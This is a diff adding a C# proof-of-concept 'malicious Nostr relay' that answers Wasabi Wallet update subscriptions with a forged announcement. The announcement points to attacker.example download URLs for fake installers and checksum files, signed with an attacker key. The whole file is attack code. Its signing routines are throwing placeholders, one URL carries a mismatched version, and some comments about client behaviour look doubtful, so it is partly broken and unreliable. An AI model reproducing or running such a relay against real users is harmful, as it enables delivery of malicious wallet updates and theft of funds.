@@ -1,0 +1,117 @@
+using System.Net;
+using System.Net.WebSockets;
+using System.Security.Cryptography;
+using System.Text;
+using System.Text.Json;
+
+// Malicious Nostr relay for the Wasabi update-announcement forgery PoC.
+// It fulfills just enough of NIP-01 for NNostr.Client, then replies with a
+// forge-signed NOT-by-Wasabi event that carries attacker download URLs.
+
+class FakeRelay
+{
+    // The WASABI TEAM public key is used ONLY in the subscription filter (client
+    // asks "events by this author"). Parasitically trustable relays forward only
+    // such events. We are that relay, but we forge.
+    const string WasabiTeamPubKeyHex = "516e1c3891bfb97089c25c35c5d96a0d20bf7d35004418b55278742a6becb051";
+
+    // Our forged keypair (freshly generated; NOT controlled by Wasabi).
+    static BitchKey AttPriv = new BitchKey(37);
+    static string AttPubHex => AttPriv.XOnlyPubHex();
+
+    static async Task Main()
+    {
+        var listener = new HttpListener();
+        listener.Prefixes.Add("http://127.0.0.1:7777/");
+        listener.Start();
+        Console.WriteLine("[RELAY] listening on ws://127.0.0.1:7777  (attacker key = " + AttPubHex + ")");
+
+        while (true)
+        {
+            var ctx = await listener.GetContextAsync();
+            if (!ctx.Request.IsWebSocketRequest) { ctx.Response.StatusCode = 400; ctx.Response.Close(); continue; }
+            var wsCtx = await ctx.AcceptWebSocketAsync(null);
+            _ = Task.Run(() => Handle(wsCtx.WebSocket));
+        }
+    }
+
+    static async Task Handle(WebSocket ws)
+    {
+        var buf = new byte[64 * 1024];
+        while (ws.State == WebSocketState.Open)
+        {
+            var res = await ws.ReceiveAsync(buf, CancellationToken.None);
+            if (res.MessageType == WebSocketMessageType.Close) { await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, null, CancellationToken.None); return; }
+            var txt = Encoding.UTF8.GetString(buf, 0, res.Count);
+            if (txt.Contains("\"REQ\""))
+            {
+                Console.WriteLine("[RELAY] REQ: " + txt);
+                var subId = JsonDocument.Parse(txt).RootElement[1].GetString()!;
+                var filter = JsonDocument.Parse(txt).RootElement[2];
+                var authors = filter.TryGetProperty("authors", out var a) ? string.Join(",", a.EnumerateArray().Select(x => x.GetString())) : "<none>";
+                var filterAuthor = filter.GetProperty("authors")[0].GetString()!;
+                // We forward our forged event keyed by the CLIENT's requested author filter,
+                // but we sign with OUR OWN private key (not the Wasabi team key).
+                var ev = BuildForgedEvent(filterAuthor);
+                var frame = JsonSerializer.Serialize(new object[] { "EVENT", subId, ev });
+                Console.WriteLine("[RELAY] -> forged EVENT (id+sig VALID for attacker key)");
+                await ws.SendAsync(Encoding.UTF8.GetBytes(frame), WebSocketMessageType.Text, true, CancellationToken.None);
+                // then EOSE so the client rests
+                await ws.SendAsync(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new object[] { "EOSE", subId })), WebSocketMessageType.Text, true, CancellationToken.None);
+            }
+            else if (txt.Contains("\"CLOSE\""))
+            {
+                return;
+            }
+        }
+    }
+
+    static object[] BuildForgedEvent(string authorFilterFromClient)
+    {
+        // NIP-01 event object: content model is OUR choice.
+        var tags = new object[][]
+        {
+            new object[]{ "version", "99.99.99" },
+            new object[]{ "SHA256SUMS", "http://attacker.example/wasabi/SHA256SUMS" },
+            new object[]{ "SHA256SUMS.asc", "http://attacker.example/wasabi/SHA256SUMS.asc" },
+            new object[]{ "SHA256SUMS.wasabisig", "http://attacker.example/wasabi/SHA256SUMS.wasabisig" },
+            new object[]{ "Wasabi-99.99.99-linux-x64.tar.gz", "http://attacker.example/wasabi/Wasabi-99.99.99-linux-x64.tar.gz" },
+            new object[]{ "Wasabi-99.99.99-linux-arm64.tar.gz", "http://attacker.example/wasabi/Wasabi-99.99.99-linux-arm64.tar.gz" },
+            new object[]{ "Wasabi-99.99.99.msi", "http://attacker.example/wasabi/Wasabi-99.99.99.msi" },
+            new object[]{ "Wasabi-99.99.99.dmg", "http://attacker.example/wasabi/Wasabi-99.99.99.dmg" },
+            new object[]{ "Wasabi-99.99.99-arm64.dmg", "http://attacker.example/wasabi/Wasabi-99.9.99-arm64.dmg" },
+        };
+        var unsigned = new
+        {
+            pubkey = AttPubHex,
+            created_at = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
+            kind = 1,
+            tags,
+            content = "Wasabi Wallet v99.99.99 security update"
+        };
+        // NIP-01 id: SHA256 of the canonical serialization with 0 + pubkey + ...
+        var idPreimage = JsonSerializer.Serialize(new object[] { 0, AttPubHex, unsigned.created_at, unsigned.kind, unsigned.tags, unsigned.content });
+        var id = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(idPreimage))).ToLowerInvariant();
+        var sig = AttPriv.SignBIP340(Convert.FromHexString(id));
+
+        return new object[] { id, unsigned.pubkey, unsigned.created_at, unsigned.kind, unsigned.tags, unsigned.content, sig };
+        // null in NostrEvent? no - this relays into the standard schema
+        // but NNostr accepts a 7-element ordered tuple as the event object
+    }
+}
+
+// A minimal BIP-340 secp256k1 key + Schnorr signer (no NuGet needed).
+sealed class BitchKey
+{
+    byte[] _priv = new byte[32];
+    static BitchKey _skE;
+
+    public BitchKey(int salt)
+    {
+        var cur = SHA256.HashData(BitConverter.GetBytes(salt));
+        Array.Copy(cur, _priv, 32);
+    }
+
+    public string XOnlyPubHex() => throw new NotSupportedException("client-side placeholder - real signing needs secp256k1");
+    public string SignBIP340(byte[] msg32) => throw new NotSupportedException("placeholder");
+}
